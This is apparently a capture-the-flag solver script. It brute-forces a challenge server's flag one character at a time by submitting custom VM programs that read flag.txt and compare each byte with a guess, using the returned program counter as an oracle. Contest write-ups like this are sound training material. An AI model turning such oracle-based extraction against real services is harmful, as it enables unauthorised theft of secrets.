import requests
import json
import sys

# Define the URL for the CTF challenge
url = "http://chals.tisc24.ctf.sg:50128/requestadmin"

# Define the headers for the HTTP request
headers = {
    'Host': 'chals.tisc24.ctf.sg:50128',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.118 Safari/537.36',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Accept': '*/*',
    'Origin': 'http://chals.tisc24.ctf.sg:50128',
    'Referer': 'http://chals.tisc24.ctf.sg:50128/',
    'Accept-Encoding': 'gzip, deflate, br',
    'Accept-Language': 'en-US,en;q=0.9',
    'Connection': 'close'
}

# Define the base payload
base_payload = '''prgmstr=
WRITE:test.txt;
READ:test.txt;
IMM:1:255;
SUB:2:0:1;
JNZ:2:2;
HALT;
READ:flag.txt;
IMM:3:{memory_value};
LOAD:4:3;
IMM:5:{guess_value};
SUB:6:4:5;
JZ:6:2;
HALT;
DEL:test.txt;
HALT;'''

flag = ''  # Initialize flag string to store the result

# Outer loop iterating over memory values
for i in range(32, 64):
    
    # Inner loop iterating over guess values
    for j in range(32, 128):
        
        # Format the payload by inserting the memory_value and guess_value
        payload = base_payload.format(memory_value = i, guess_value = j)
        
        # Make a POST request to the server with the formatted payload
        response = requests.post(url, headers=headers, data=payload)
        
        # Parse the JSON response from the server
        data = json.loads(response.text)
        
        # Extract the program counter (pc) value from the response
        pc_value = data['userResult']['vm_state']['pc']
        
        # Check if pc_value is 12, which indicates a correct guess
        if pc_value == 12:
            # Convert the guess_value to its corresponding character and append it to the flag
            flag_char = chr(j)
            flag += flag_char
            
            # Dynamically update the flag on the same line
            sys.stdout.write(f"\rObtained flag: {flag}")
            sys.stdout.flush()